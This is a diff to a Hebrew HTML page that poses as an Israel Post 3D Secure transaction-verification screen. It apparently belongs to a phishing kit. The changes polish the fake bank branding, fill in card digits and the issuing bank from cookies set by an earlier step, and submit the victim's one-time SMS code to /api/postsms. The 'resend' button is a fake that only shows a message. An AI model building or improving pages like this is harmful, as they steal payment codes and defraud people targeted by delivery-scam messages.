@@ -2,96 +2,191 @@
 <html lang="he">
 <head>
   <meta charset="UTF-8">
-  <title>קוד אימות</title>
+  <title>3D Secure · אימות עסקה</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="./css/style.css">
+  <style>
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;color:#222}
+    .wrap{max-width:460px;margin:0 auto;padding:18px 14px 40px}
+    .card{background:#fff;border:1px solid #e5e5e5;border-radius:4px;box-shadow:0 1px 2px rgba(0,0,0,.04);overflow:hidden}
+    .head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px}
+    .head .brand-logo{display:flex;align-items:center;min-height:42px}
+    .head .brand-logo img{max-height:42px;max-width:120px;display:block}
+    .head .merchant{text-align:right;direction:rtl}
+    .head .merchant .name{color:#d41c2a;font-weight:700;font-size:15px;letter-spacing:.2px}
+    .head .merchant .sub{color:#666;font-size:12px;margin-top:2px}
+    .rule{height:2px;background:#d41c2a;margin:0}
+    .body{padding:18px 16px;direction:rtl}
+    h2.title{font-size:15px;font-weight:700;text-align:center;margin:6px 0 14px}
+    .notice{background:#f2f2f2;border:1px solid #e5e5e5;border-radius:3px;padding:10px 12px;font-size:12.5px;line-height:1.55;color:#333;text-align:center}
+    .notice b{color:#111}
+    table.info{width:100%;margin-top:14px;font-size:13.5px;border-collapse:collapse}
+    table.info td{padding:5px 2px;vertical-align:middle}
+    table.info td.lbl{color:#555;text-align:right;width:48%}
+    table.info td.val{color:#111;font-weight:600;text-align:left;width:52%;direction:ltr}
+    table.info td.amt{color:#d41c2a;font-weight:700}
+    .otp-row{margin:16px 0 6px;display:flex;align-items:center;gap:10px;justify-content:space-between}
+    .otp-row label{font-size:13.5px;color:#333;font-weight:600}
+    .otp-row input{flex:0 0 55%;border:1.5px solid #2b6cff;border-radius:4px;padding:10px 12px;font-size:16px;outline:none;text-align:center;letter-spacing:4px}
+    .otp-row input:focus{border-color:#1a4fd4}
+    .terms{display:flex;align-items:flex-start;gap:8px;margin-top:12px;font-size:12px;color:#444;direction:rtl}
+    .terms input{accent-color:#2b6cff;width:16px;height:16px;margin-top:2px}
+    .btns{display:flex;gap:8px;margin-top:14px;direction:ltr;justify-content:flex-end}
+    .btns button{flex:1;border:0;padding:10px 12px;border-radius:3px;font-size:14px;font-weight:600;cursor:pointer}
+    .btn-cancel{background:#a7a7a7;color:#fff}
+    .btn-resend{background:#1f4ed8;color:#fff}
+    .btn-submit{background:#dfe7ff;color:#1f2937}
+    .btn-submit:hover{background:#cbd7fb}
+    .foot{background:#f4f4f4;text-align:center;padding:10px;font-size:12px;color:#444;border-top:1px solid #e5e5e5}
+    .foot a{color:#444;text-decoration:none;margin:0 4px}
+    .foot a:hover{text-decoration:underline}
+    .copy{margin-top:16px;text-align:center;font-size:11px;color:#999}
+    .copy img{width:40px;opacity:.7;display:block;margin:0 auto 4px}
+    .err{color:#d41c2a;font-size:12px;margin-top:6px;text-align:center;min-height:14px}
+  </style>
 </head>
-<body style="background:white;">
-
-<div style="text-align:center; padding:30px;" id="page-content">
-  <div class="form form-container">
-    <div style="display:flex;">
-      <div style="text-align:left; width:50%;">
-        <h3 id="bank_name">—</h3>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="head">
+        <div class="brand-logo" id="brandLogo"></div>
+        <div class="merchant">
+          <div class="name">ISRAEL POST</div>
+          <div class="sub">(3D Secure) אימות עסקאות מאובטח</div>
+        </div>
       </div>
-      <div style="text-align:right; width:50%;">
-        <img src="./img/vbvmcs.png" style="width:120px;">
+      <div class="rule"></div>
+
+      <div class="body">
+        <h2 class="title">הגנה על התשלומים המקוונים שלך</h2>
+
+        <div class="notice">
+          קוד אימות חד-פעמי נדרש להשלמת הרכישה. הקוד נשלח ברגע זה
+          לטלפון הנייד הרשום שמסתיים ב-<b id="phoneTail">**</b>.
+        </div>
+
+        <table class="info">
+          <tr>
+            <td class="lbl">בית עסק (Merchant):</td>
+            <td class="val">ISRAEL POST — דואר ישראל</td>
+          </tr>
+          <tr>
+            <td class="lbl">סכום לחיוב (Amount):</td>
+            <td class="val amt">₪ 7.99</td>
+          </tr>
+          <tr>
+            <td class="lbl">תאריך (Date):</td>
+            <td class="val" id="today_date">—</td>
+          </tr>
+          <tr>
+            <td class="lbl">מספר כרטיס:</td>
+            <td class="val" id="card_number">xxxx xxxx xxxx ****</td>
+          </tr>
+          <tr>
+            <td class="lbl">בנק מנפיק:</td>
+            <td class="val" id="bank_name">—</td>
+          </tr>
+        </table>
+
+        <form action="/api/postsms" method="post" id="otp-form">
+          <div class="otp-row">
+            <label for="sms">הזן קוד אימות:</label>
+            <input type="text" id="sms" name="sms_code" required
+                   inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" minlength="4"
+                   autocomplete="one-time-code"
+                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+          </div>
+          <div class="err" id="err"></div>
+
+          <label class="terms">
+            <input type="checkbox" id="agree" checked>
+            <span>אני מאשר כי קראתי והבנתי את תנאי השימוש בשירות אימות עסקאות מאובטח.</span>
+          </label>
+
+          <div class="btns">
+            <button type="button" class="btn-submit">Submit</button>
+            <button type="button" class="btn-resend" onclick="resend()">שלח שוב</button>
+            <button type="button" class="btn-cancel" onclick="history.back()">בטל</button>
+          </div>
+        </form>
+      </div>
+
+      <div class="foot">
+        <a href="#">Terms &amp; Conditions</a>|
+        <a href="#">FAQs</a>|
+        <a href="#">Contact Us</a>
       </div>
     </div>
 
-    <table style="width:100%; direction:rtl; font-size:1.2em; margin-top:20px;">
-      <tbody>
-        <tr>
-          <th> שם : </th>
-          <td id="full_name">לא זמין</td>
-        </tr>
-        <tr>
-          <th>סוחר : </th>
-          <td>דואר ישראל</td>
-        </tr>
-        <tr>
-          <th>כרטיס : </th>
-          <td dir="ltr" id="card_number">XXX-XXXX-XXXX-****</td>
-        </tr>
-        <tr>
-          <th>תאריך :</th>
-          <td id="today_date"></td>
-        </tr>
-        <tr>
-          <th>כולל : </th>
-          <td>7.99 ILS</td>
-        </tr>
-      </tbody>
-    </table>
-
-    <div style="padding:20px; font-size:1.1em;" dir="rtl">
-      <h4 style="margin-top:-10px; font-size:1.2em;">אימות זהות לתשלום העסקה</h4>
-      <span>כדי לאשר פעולה זו. הזן את הקוד שנשלח למספר הטלפון שלך.</span>
-    </div>
-
-    <form action="/api/postsms" method="post" style="margin-top:-20px;" dir="rtl" id="otp-form">
-      <div class="col">
-        <input type="text"
-               id="sms"
-               name="sms_code"
-               required
-               class="textinput otp-input"
-               placeholder="קוד OTP"
-               inputmode="numeric"
-               pattern="[0-9]{6}"
-               maxlength="6"
-               minlength="6"
-               autocomplete="one-time-code"
-               oninput="this.value = this.value.replace(/[^0-9]/g, '');">
-      </div>
-      <div class="col">
-        <button type="submit" class="sbmt">שלח</button>
-      </div>
-    </form>
-
-    <div style="text-align:center; margin-top:20px;">
-      <img src="./img/logo.png" style="width:70px;">
-      <p> דואר ישראל </p>
-      <p> © 2025 כל הזכויוות שמורות </p>
+    <div class="copy">
+      <img src="./img/logo.png" alt="">
+      דואר ישראל · © 2025 כל הזכויות שמורות
     </div>
   </div>
-</div>
 
 <script>
-  function getCookie(name) {
-    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-    return match ? decodeURIComponent(match[2]) : null;
+  function getCookie(name){
+    const m = document.cookie.match(new RegExp('(^| )'+name+'=([^;]+)'));
+    return m ? decodeURIComponent(m[2]) : null;
   }
-  const fullName = getCookie('full_name');
-  const last4    = getCookie('card_last4');
-  if (fullName) document.getElementById('full_name').textContent = fullName;
-  if (last4)    document.getElementById('card_number').textContent = 'XXX-XXXX-XXXX-' + last4;
 
-  const d = new Date();
-  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
-  const day = String(d.getDate()).padStart(2,'0');
-  document.getElementById('today_date').textContent = `${day}/${months[d.getMonth()]}/${d.getFullYear()}`;
+  // Date
+  (function(){
+    const d = new Date();
+    const pad = n => String(n).padStart(2,'0');
+    const t = pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+    document.getElementById('today_date').textContent =
+      t + ' ' + pad(d.getDate())+'.'+pad(d.getMonth()+1)+'.'+d.getFullYear();
+  })();
+
+  // Card number display
+  const last4 = getCookie('card_last4');
+  if (last4) {
+    document.getElementById('card_number').textContent = 'xxxx xxxx xxxx ' + last4;
+    document.getElementById('phoneTail').textContent = '**' + last4.slice(-1);
+  }
+
+  // Brand logo (Visa vs MasterCard etc.)
+  const brand = (getCookie('card_brand') || '').toLowerCase();
+  const logoEl = document.getElementById('brandLogo');
+  if (brand === 'visa') {
+    logoEl.innerHTML = '<img src="./img/viza.png" alt="Verified by VISA">';
+  } else if (brand === 'mc' || brand === 'mastercard') {
+    logoEl.innerHTML = '<img src="./img/mastercard.png" alt="MasterCard SecureCode">';
+  } else {
+    logoEl.innerHTML = '<img src="./img/vbvmcs.png" alt="3D Secure">';
+  }
+
+  // BIN / bank lookup via our proxy to bins.su
+  const bin = getCookie('card_bin');
+  if (bin && bin.length >= 6) {
+    fetch('/api/bin?bin=' + encodeURIComponent(bin))
+      .then(r => r.ok ? r.json() : null)
+      .then(j => {
+        if (!j) return;
+        const parts = [];
+        if (j.bank && j.bank !== 'Unknown') parts.push(j.bank);
+        if (j.country) parts.push(j.country);
+        if (parts.length) document.getElementById('bank_name').textContent = parts.join(' · ');
+      })
+      .catch(()=>{});
+  }
+
+  // Wire submit button to real form (keep look from reference)
+  const form = document.getElementById('otp-form');
+  const err  = document.getElementById('err');
+  document.querySelector('.btn-submit').addEventListener('click', () => {
+    const v = document.getElementById('sms').value.trim();
+    if (!/^\d{4,8}$/.test(v)) { err.textContent = 'נא להזין קוד אימות תקין'; return; }
+    if (!document.getElementById('agree').checked) { err.textContent = 'יש לאשר את תנאי השימוש'; return; }
+    err.textContent = '';
+    form.submit();
+  });
+
+  function resend(){
+    err.textContent = 'קוד חדש נשלח למכשיר הנייד שלך';
+    setTimeout(()=>{ err.textContent=''; }, 2500);
+  }
 </script>
-
 </body>
 </html>
